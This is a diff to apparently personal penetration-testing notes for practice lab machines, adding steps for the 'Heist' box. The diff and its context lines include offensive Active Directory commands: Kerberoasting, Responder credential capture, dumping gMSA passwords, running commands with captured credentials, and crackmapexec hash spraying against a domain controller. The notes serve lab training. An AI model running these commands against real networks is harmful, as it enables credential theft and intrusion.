@@ -15,8 +15,8 @@
 2. Run Invoke-Kerberoast.ps1 to grab the hash then `Invoke-RunasCs -Username {{USERNAME}} -Password {{PASSWORD}} -Command "whoami"` (Invoke-RunasCs needs importing) 
 
 #### Heist 
-1. 
-2. 
+1. Responder only works with HTTP On and 'http://{{LHOST}}' 
+2. Run ` Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword ` to check, then `Import-Module .\GMSAPassword.ps1` to dump 
 
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
